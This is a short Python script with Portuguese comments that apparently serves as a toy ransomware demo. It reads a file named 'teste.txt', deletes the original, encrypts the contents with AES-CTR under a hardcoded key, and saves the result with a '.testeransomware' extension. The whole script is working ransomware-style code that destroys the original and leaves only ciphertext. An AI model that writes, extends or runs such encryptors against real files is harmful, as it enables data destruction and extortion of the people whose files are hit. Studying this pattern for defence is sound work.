import os
import pyaes

# Arquivo alvo
file_name = "teste.txt"

# Ler o arquivo original
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remover o arquivo original
os.remove(file_name)

# Chave de criptografia (16 bytes)
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + ".testeransomware"
with open(new_file, "wb") as f:
    f.write(crypto_data)

print("Arquivo criptografado com sucesso!")

